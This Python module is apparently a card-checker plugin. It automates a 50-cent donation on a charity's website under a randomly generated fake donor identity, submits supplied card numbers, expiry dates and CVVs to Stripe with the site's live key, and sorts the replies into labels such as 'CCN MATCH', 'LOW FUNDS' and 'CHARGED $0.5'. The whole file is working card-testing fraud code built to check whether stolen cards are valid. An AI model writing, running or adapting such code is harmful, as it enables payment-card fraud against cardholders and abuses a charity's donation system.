import requests
from mills.plugins._helpers.tools import find_between
from mills.classes.rand_user import RandUser



def ck_one(r):
    rand_user = RandUser().rand_user()
    a = r.get(f'https://www.bintwinning.org/donate/')
    if not a:return
    b_data = {
'total_donation': '0.50',
'small': '0',
'medium': '0',
'large': '0',
'commercial': '0',
}   
    b = r.post('https://www.bintwinning.org/donation/store/', b_data)
    if not b: return
    
    c_data = {
'title': 'Mr',
'forename': rand_user['first_name'],
'surname': rand_user['last_name'],
'organisation': '',
'address_line_1': rand_user['street'],
'address_line_2': '',
'town': rand_user['city'],
'county': rand_user['state'],
'postcode': rand_user['zip'],
'country': 'US',
'email': rand_user['email'],
'confirm_email': rand_user['email'],
'phone_number': rand_user['phone'],
'supporter_type': 'individual',
'found_us_via': 'Other',
'event_source': '',
}
    c = r.post('https://www.bintwinning.org/checkout/billing/update/', c_data)
    if not c: return

    d = r.post('https://www.bintwinning.org/checkout/confirmed/', {})
    if not d: return

    e = r.post('https://api.bintwinning.org/api/stripe/payment-intent-secret',{'amount': 50})
    if not e: return
    sec = e.json()['data']['client_secret']
    if not sec :return
    urlk = sec.split('_secret_')[0]
    return sec, urlk
    





def ck_two(sec, req_sec, cc, mes,ano, cvv):
    payload_e = {
'payment_method_data[type]': 'card',
'payment_method_data[card][number]': cc,
'payment_method_data[card][cvc]': cvv,
'payment_method_data[card][exp_month]': mes,
'payment_method_data[card][exp_year]': ano,
'payment_method_data[pasted_fields]': 'number',
'payment_method_data[payment_user_agent]': 'stripe.js/394a74bde; stripe-js-v3/394a74bde',
'payment_method_data[time_on_page]': '52031',
'expected_payment_method_type': 'card',
'use_stripe_sdk': 'true',
'key': 'pk_live_51AKkHXJ7SuHQfYVEX6zZEzlUObvoL8SxDSnf9cze3NTkrDEMEson8SQ3keLlzyjsxgyqZibT15BNnUhQ5lnDnND2007e0ee73t',
'client_secret': sec,
}

    e = requests.post(f'https://api.stripe.com/v1/payment_intents/{req_sec}/confirm', data = payload_e)
    return e.json()



def get_response_ck(text: str):
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'DECLINED'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN MATCH", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'DECLINED'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'DECLINED'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'DECLINED'
    elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "CHARGED $0.5", "✅", 'CVV MATCH'
    else:
        r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
    r_text1 = text.strip() if text else r_text
    return r_text1, r_logo, r_respo